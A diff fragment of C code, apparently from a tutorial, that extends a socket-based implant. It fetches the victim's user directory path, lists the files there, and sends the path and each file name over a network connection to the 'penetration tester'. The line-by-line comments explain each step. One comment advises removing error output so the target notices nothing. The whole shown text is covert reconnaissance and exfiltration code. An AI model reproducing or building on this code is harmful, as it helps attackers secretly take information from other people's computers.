@@ -51,3 +51,25 @@ listening port
 connect(server, (SOCKADDR *)&addr, sizeof(addr)); //connect to the 
 previously set up target host/port
  
+ char* pPath = userDirectory(); // new local variable pPath is declared 
+and user’s directory is assigned to it (using the previously written function 
+userDirectory()
+send(server, pPath, sizeof(pPath), 0); //the path is sent to the
+penetration tester on the previously set ip address and port
+DIR *dir; //new variable named dir: pointer to type DIR
+struct dirent *ent; //new variable named ent: pointer to structure 
+if ((dir = opendir (pPath)) != NULL) { //if opening directory at 
+retrieved path brings any results
+ while ((ent = readdir (dir)) != NULL) { //iterate over items 
+within the directory, as long as there are next items:
+ send(server, ent->d_name, sizeof(ent->d_name), 0); //send name of 
+current item (file or directory contained within user’s path) to the
+penetration tester
+ }
+closedir (dir); //close the directory that was read
+} else {
+perror (""); //if there was an error opening the directory, print 
+the error – this can be deleted from the final version if it works correctly
+so that the target does not see errors printed
+ 
+ 
